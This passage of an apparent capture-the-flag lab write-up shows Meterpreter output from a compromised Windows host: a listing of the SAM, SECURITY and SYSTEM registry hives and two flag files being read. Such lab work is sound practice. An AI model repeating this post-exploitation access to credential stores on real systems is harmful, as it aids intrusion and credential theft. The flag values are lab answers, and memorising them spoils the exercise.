+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
+100666/rw-rw-rw-  1048576   fil   2023-08-26 12:45:43 -0400  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2023-08-26 12:45:43 -0400  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2023-08-26 12:45:44 -0400  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536     fil   2023-08-26 12:45:43 -0400  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
+100666/rw-rw-rw-  65536     fil   2018-12-12 22:20:57 -0500  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2018-12-12 22:20:57 -0500  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2009-07-14 01:01:27 -0400  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2023-08-26 13:07:45 -0400  DEFAULT
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  DEFAULT.LOG
+100666/rw-rw-rw-  177152    fil   2023-08-26 13:07:45 -0400  DEFAULT.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:17 -0400  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0         dir   2009-07-13 22:34:57 -0400  Journal
+040777/rwxrwxrwx  4096      dir   2019-03-17 15:56:54 -0400  RegBack
+100666/rw-rw-rw-  262144    fil   2019-03-17 16:05:08 -0400  SAM
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SAM.LOG
+100666/rw-rw-rw-  21504     fil   2019-03-17 18:39:12 -0400  SAM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:17 -0400  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2023-08-26 13:06:59 -0400  SECURITY
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SECURITY.LOG
+100666/rw-rw-rw-  21504     fil   2023-08-26 13:06:59 -0400  SECURITY.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:17 -0400  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:17 -0400  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  40632320  fil   2023-08-26 13:15:22 -0400  SOFTWARE
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SOFTWARE.LOG
+100666/rw-rw-rw-  262144    fil   2023-08-26 13:15:22 -0400  SOFTWARE.LOG1
+100666/rw-rw-rw-  262144    fil   2023-08-26 12:56:49 -0400  SOFTWARE.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:19 -0400  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:19 -0400  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:19 -0400  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  12582912  fil   2023-08-26 13:20:36 -0400  SYSTEM
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:06 -0400  SYSTEM.LOG
+100666/rw-rw-rw-  262144    fil   2023-08-26 13:20:36 -0400  SYSTEM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:22 -0400  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  4096      dir   2018-12-12 18:03:05 -0500  TxR
+100666/rw-rw-rw-  34        fil   2019-03-17 15:32:48 -0400  flag2.txt (******)
+040777/rwxrwxrwx  4096      dir   2010-11-20 21:41:37 -0500  systemprofile
+
+meterpreter > cat flag2.txt 
+flag{sam_database_elevated_access}meterpreter > 
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+eterpreter > cd DOcuments
+meterpreter > ls
+Listing: C:\Users\Jon\DOcuments
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Music
+040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Pictures
+040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-12 22:13:48 -0500  desktop.ini
+100666/rw-rw-rw-  37    fil   2019-03-17 15:26:36 -0400  flag3.txt
+
+meterpreter > cat flag3.txt
+flag{admin_documents_can_be_valuable}meterpreter > 
+---------------------------------------------------------------------------------------------------------------------------------------------
+
